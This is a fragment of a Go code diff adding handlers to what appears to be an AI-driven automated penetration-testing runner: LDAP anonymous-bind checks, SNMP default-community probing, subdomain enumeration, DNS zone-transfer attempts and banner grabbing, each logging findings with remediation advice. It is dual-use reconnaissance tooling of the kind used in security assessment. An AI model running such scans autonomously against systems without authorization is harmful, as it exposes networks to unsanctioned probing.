+	if strings.Contains(result.Output, "[CRITICAL]") {
+		r.state.Vulnerabilities = append(r.state.Vulnerabilities, Finding{
+			Type:        "ldap_anonymous",
+			Severity:    "critical",
+			Target:      target,
+			Description: "LDAP allows anonymous bind - can enumerate users/groups",
+			Evidence:    result.Output,
+			Remediation: "Disable anonymous LDAP binds",
+			Timestamp:   time.Now(),
+		})
+	}
+
+	return action, nil
+}
+
+func (r *AutoRunner) actionSNMPCheck(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
+	target := extractHost(decision.Target)
+	if target == "" {
+		target = r.state.Target
+	}
+
+	result := r.framework.ExploitDB.CheckSNMP(target, "public,private")
+
+	action.Result = result.Output
+	action.Success = result.Success
+
+	if strings.Contains(result.Output, "[CRITICAL]") {
+		r.state.Vulnerabilities = append(r.state.Vulnerabilities, Finding{
+			Type:        "snmp_default_community",
+			Severity:    "high",
+			Target:      target,
+			Description: "SNMP accessible with default community strings",
+			Evidence:    result.Output,
+			Remediation: "Use SNMPv3 with authentication, change community strings",
+			Timestamp:   time.Now(),
+		})
+	}
+
+	return action, nil
+}
+
+func (r *AutoRunner) actionSubdomainScan(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
+	domain := decision.Target
+	if domain == "" {
+		domain = r.state.Target
+	}
+	// Remove any protocol prefix
+	domain = strings.TrimPrefix(domain, "http://")
+	domain = strings.TrimPrefix(domain, "https://")
+	domain = strings.Split(domain, "/")[0]
+	domain = strings.Split(domain, ":")[0]
+
+	result := r.framework.ExploitDB.SubdomainEnum(domain, "small")
+
+	action.Result = result.Output
+	action.Success = result.Success
+
+	return action, nil
+}
+
+func (r *AutoRunner) actionDNSZoneTransfer(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
+	domain := decision.Target
+	if domain == "" {
+		domain = r.state.Target
+	}
+	domain = strings.TrimPrefix(domain, "http://")
+	domain = strings.TrimPrefix(domain, "https://")
+	domain = strings.Split(domain, "/")[0]
+	domain = strings.Split(domain, ":")[0]
+
+	result := r.framework.ExploitDB.DNSZoneTransfer(domain, "")
+
+	action.Result = result.Output
+	action.Success = result.Success
+
+	if strings.Contains(result.Output, "[CRITICAL]") {
+		r.state.Vulnerabilities = append(r.state.Vulnerabilities, Finding{
+			Type:        "dns_zone_transfer",
+			Severity:    "high",
+			Target:      domain,
+			Description: "DNS zone transfer allowed - full DNS enumeration possible",
+			Evidence:    result.Output,
+			Remediation: "Restrict zone transfers to authorized secondary DNS servers only",
+			Timestamp:   time.Now(),
+		})
+	}
+
+	return action, nil
+}
+
+func (r *AutoRunner) actionBannerGrab(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
+	target := decision.Target
+	if target == "" {
+		target = r.state.Target
+	}
+
+	host, port := extractHostAndPort(target)
+	if host == "" {
+		host = r.state.Target
+	}
+	if port == 0 {
+		port = 80
+	}
+
+	result := r.framework.ExploitDB.GrabBanner(host, port)
+
+	action.Result = result.Output
+	action.Success = result.Success
+
+	// Update service info if banner contains version
+	if result.Success && result.Output != "" {
+		for i, svc := range r.state.Services {
+			if svc.Host == host && svc.Port == port {
+				r.state.Services[i].Banner = result.Output
+				break
+			}
+		}
 	}
 
 	return action, nil
